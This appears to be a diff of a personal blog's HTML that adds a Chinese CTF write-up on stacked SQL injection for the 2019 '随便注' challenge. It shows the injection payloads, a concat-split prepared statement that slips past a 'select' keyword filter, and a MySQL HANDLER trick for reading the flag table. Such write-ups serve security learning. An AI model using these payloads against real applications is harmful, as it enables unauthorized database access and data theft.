@@ -6,18 +6,27 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2021/7 | Gm_blog</title>
+  <title>（wp）ctfweb-sql堆叠注入及预编译的学习 | Gm_blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="个人技术博客">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Gm_blog">
-<meta property="og:url" content="http://example.com/archives/2021/07/index.html">
+  <meta name="description" content="很久没有碰sql注入了，最近几天复习了一下，顺便掌握了点新的知识。 好多题的wp我都懒得写了，挑一两道写吧">
+<meta property="og:type" content="article">
+<meta property="og:title" content="（wp）ctfweb-sql堆叠注入及预编译的学习">
+<meta property="og:url" content="http://example.com/2021/08/01/(wp)ctfweb-sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/index.html">
 <meta property="og:site_name" content="Gm_blog">
-<meta property="og:description" content="个人技术博客">
+<meta property="og:description" content="很久没有碰sql注入了，最近几天复习了一下，顺便掌握了点新的知识。 好多题的wp我都懒得写了，挑一两道写吧">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/08/01/mO94La6BcXyQAje.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/01/MFI4bqQuwJLSGXN.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/01/u5ezX1GCZvMYxoQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/01/QXhwPlA4Bk1ayGV.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/01/vLFh9eMqa6DC8OW.png">
+<meta property="og:image" content="https://i.loli.net/2021/08/01/uLexr5p63CUsQmw.png">
+<meta property="article:published_time" content="2021-08-01T07:01:31.153Z">
+<meta property="article:modified_time" content="2021-08-01T07:06:13.126Z">
 <meta property="article:author" content="gaomeng">
-<meta property="article:tag" content="学习经验分享及总结">
+<meta property="article:tag" content="sql">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/08/01/mO94La6BcXyQAje.png">
   
     <link rel="alternative" href="/atom.xml" title="Gm_blog" type="application/atom+xml">
   
@@ -169,211 +178,254 @@
           </div>
           <div id="js-content" class="content-ll">
             
-  
-  
+<article id="post-(wp)ctfweb-sql堆叠注入及预编译的学习" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      （wp）ctfweb-sql堆叠注入及预编译的学习
+    </h1>
+  
+
+        
+        <a href="/2021/08/01/(wp)ctfweb-sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="archive-article-date">
+  	<time datetime="2021-08-01T07:01:31.153Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-08-01</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>很久没有碰sql注入了，最近几天复习了一下，顺便掌握了点新的知识。</p>
+<p>好多题的wp我都懒得写了，挑一两道写吧</p>
+<span id="more"></span>
+
+<p>先推一下两篇很有帮助的文章，以后自己复习用</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/103239145?utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromMachineLearnPai2~default-1.control">[强网杯 2019]随便注 的三种解法</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43427482/article/details/109898934">MySQL 之 handler 的详细使用及说明</a></p>
+<h2 id="1-强网杯-2019-随便注"><a href="#1-强网杯-2019-随便注" class="headerlink" title="1.[强网杯 2019]随便注"></a>1.[强网杯 2019]随便注</h2><p>1.先试试万能密码 <code>1‘ or 1=1 #</code></p>
+<p>有回显，这说明可以注入：</p>
+<p><img src="https://i.loli.net/2021/08/01/mO94La6BcXyQAje.png" alt="1.1.png" style="zoom:50%;"><!--p1--></p>
+<p>做个FUZZ测试，不放图了，发现select等关键词都被ban了，无法联合，只能少量报错注入。</p>
+<p>因此考虑堆叠注入。</p>
+<p>查库名： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show databases;#  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/01/MFI4bqQuwJLSGXN.png" alt="1.2.png" style="zoom:50%;"><!--p2--></p>
+<p>查表名:  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show tables;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/01/u5ezX1GCZvMYxoQ.png" alt="1.3.png" style="zoom:50%;"><!--p3--></p>
+<p>显然flag应该在长的那串数字里，查列名: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; show columns from `1919810931114514`;#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/08/01/QXhwPlA4Bk1ayGV.png" alt="1.4.png" style="zoom:50%;"><!--p4--></p>
+<p>flag在这里，但是显示不出来flag，很尴尬，于是学会了两个方法，</p>
+<p>第一种比较常规，第二种比较万能。</p>
+<p><strong>第一种：预编译</strong></p>
+<p>因为select被ban了，可以考虑 <strong>16进制编码</strong>绕过，也可以考虑<strong>拼接语句</strong>绕过，我用了拼接语句。</p>
+<p>先构造语句 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> `<span class="number">1919810931114514</span>`</span><br></pre></td></tr></table></figure>
+
+<p>进行预编译：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; SET @a= concat(&#x27;sel&#x27;,&#x27;ect&#x27;,&#x27;* from `1919810931114514`&#x27;); prepare flag from @a; execute flag;#</span><br></pre></td></tr></table></figure>
+
+<p>注释一下：</p>
+<ol>
+<li>定义：    SET @变量= 语句（命令）</li>
+<li>预编译：   prepare name from 语句 </li>
+<li>执行：   excute name</li>
+</ol>
+<hr>
+<p><strong>第二种：handler方法</strong></p>
+<p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。</p>
+<p><strong>此处需要用到的语法：</strong></p>
+<p><img src="https://i.loli.net/2021/08/01/vLFh9eMqa6DC8OW.png" alt="1.5.png" style="zoom:50%;"><!--p5--></p>
+<p>构造payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as a; handler a read first;#</span><br></pre></td></tr></table></figure>
+
+<p>随便哪个payload都可得到flag：</p>
+<p><img src="https://i.loli.net/2021/08/01/uLexr5p63CUsQmw.png" alt="1.6.png" style="zoom:50%;"><!--p6--></p>
+<p>另外本题还能通过改名和mysql约束去做，感觉太麻烦了，没学。。</p>
+<hr>
+<p>后面遇到堆叠注入和预编译的题再补上，就这样</p>
+<hr>
+<p>END</p>
+
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/alipay.jpg">
+                      <span class="reward-type">支付宝</span>
+                    </div>
+                    
+                    
+                    <div class="reward-box-item">
+                      <img class="reward-img" src="/assets/wechatzf.jpg">
+                      <span class="reward-type">微信</span>
+                    </div>
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2021" class="archive-year">2021</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/07/27/(wp)ctfweb-%E7%BD%91%E7%AB%99%E4%B8%ADlinux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" class="archive-article-date">
-  	<time datetime="2021-07-27T13:45:24.931Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-27</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/07/27/(wp)ctfweb-%E7%BD%91%E7%AB%99%E4%B8%ADlinux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">（wp）ctfweb-网站中linux命令执行</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">命令执行</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">sql</a>
         		</li>
       		
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://2740908911.github.io/021/08/01/(wp)ctfweb-sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/07/27/(wp)ctfweb-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/" class="archive-article-date">
-  	<time datetime="2021-07-27T09:46:52.065Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-27</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2021/07/27/(wp)ctfweb-%E7%BD%91%E7%AB%99%E4%B8%ADlinux%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">（wp）ctfweb-网站中linux命令执行</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/07/27/(wp)ctfweb-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%20%E4%BC%AA%E5%8D%8F%E8%AE%AE/">（wp）ctfweb-伪协议文件包含漏洞</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">文件包含</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%BC%BA%E7%BD%91%E6%9D%AF-2019-%E9%9A%8F%E4%BE%BF%E6%B3%A8"><span class="toc-number">1.</span> <span class="toc-text">1.[强网杯 2019]随便注</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/07/04/(wp)ctfweb-buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
-  	<time datetime="2021-07-04T14:48:57.312Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-04</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/07/04/(wp)ctfweb-buu%E4%B8%ADphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">（wp）ctfweb-buu中php反序列化</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">反序列化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/07/04/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
-  	<time datetime="2021-07-04T10:33:13.829Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/07/04/ctfweb-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">ctfweb-PHP反序列化</a>
-    </h1>
+  <div id="SOHUCS" sid="(wp)ctfweb-sql堆叠注入及预编译的学习" ></div> 
+<script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
+<script type="text/javascript">
+    window.changyan.api.config({
+        appid: "cyvvAVWea",
+        conf: "cc487dd5c1839c1337e8870e3549cecd"
+    });
+</script>
+</script>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">反序列化</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2021/07/01/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/" class="archive-article-date">
-  	<time datetime="2021-07-01T03:03:51.726Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-07-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2021/07/01/php%E5%AD%A6%E4%B9%A0%E4%B8%AD%E4%B8%80%E4%BA%9B%E6%98%93%E5%BF%98%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/">php的浅显学习中一些知识点</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
   
-  
-    </div></section>
-  
-
-    
 
 
           </div>
@@ -400,8 +452,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
